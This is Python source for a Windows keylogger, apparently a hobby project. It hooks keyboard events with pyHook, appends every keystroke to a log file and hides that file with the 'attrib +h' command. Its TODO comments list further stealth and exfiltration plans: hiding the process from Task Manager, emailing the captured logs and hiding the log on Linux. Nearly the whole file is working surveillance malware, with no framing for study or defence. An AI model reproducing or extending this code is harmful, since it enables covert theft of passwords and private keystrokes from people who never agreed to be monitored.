import win32console
import win32gui
import pyHook
import pythoncom
import sys
import logging
import os

## -> TODO <- ##
## -> install dependencies on the fly
## -> find sweet location for output file
## -> hide process from the task manager
## -> send mail if possible
## -> function to reformat the output
## [DONE] -> hide log file on windows
## -> hide log file on Linux


## hide console
win=win32console.GetConsoleWindow()
win32gui.ShowWindow(win,1)

## init output file on windows
if(os.name == "nt"):

	## create log file
	file_log="C:\\Users\\Nathan\\Desktop\\Prog\\lull4by\\test.txt"
	if(not os.path.isfile(file_log)):
		f=open(file_log,"w")
		f.close()

	## hide the file
	p = os.popen('attrib +h ' + file_log)
	t = p.read()
	p.close()

## init input file on Linux
else:

	print "TODO : Linux stuff"


## core
def onKeyboardEvent(event):
	logging.basicConfig(filename=file_log,level=logging.DEBUG,format='%(message)s')
	chr(event.Ascii)
	logging.log(10,chr(event.Ascii))
	return True

## create a hook manager object
hooks_manager=pyHook.HookManager()
hooks_manager.KeyDown=onKeyboardEvent
hooks_manager.HookKeyboard()

## wait forever
pythoncom.PumpMessages()